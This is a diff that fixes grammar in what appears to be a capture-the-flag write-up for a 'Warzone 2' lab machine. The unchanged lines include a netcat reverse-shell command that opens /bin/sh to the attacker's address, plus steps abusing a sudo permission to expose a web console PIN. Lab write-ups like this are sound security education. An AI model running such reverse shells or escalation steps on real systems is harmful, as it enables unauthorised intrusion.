@@ -76,7 +76,7 @@ Successfully got access with 'lower' credentials.
 
 ![access](screenshots/1337_access.png)
 
-But we don't have shell yet.
+But we don't have a shell yet.
 
 ### Shell
 
@@ -90,7 +90,7 @@ Target:
 ```
 nc 192.168.88.225 4444 -c /bin/sh
 ```
-So, after target connected to us, it will open a shell.
+So, after the target connected to us, it will open a shell.
 
 ![shell](screenshots/shell.png)
 
@@ -109,12 +109,12 @@ Now we have a good shell and ssh access.
 
 ## Post exploitation
 
-`sudo -l` will show you admiral wrz2-app.py execute permission which is similiar to server from previous machine Warzone 1
+`sudo -l` will show you admiral wrz2-app.py execute permission which is similar to the server from the previous machine Warzone 1
 ```
 sudo -u admiral /usr/bin/python3 /home/admiral/warzone2-app/wrz2-app.py
 ```
-Then you will see the PIN to console on web server. It was not available in previous server because you can see it only on the server side.
-Also, the app shows you that it is running on 127.0.0.1:5000 which is local service.
+Then you will see the PIN to console on a web server. It was not available on the previous server because you can see it only on the server-side.
+Also, the app shows you that it is running on 127.0.0.1:5000 which is a local service.
 
 ### Port forwarding
 
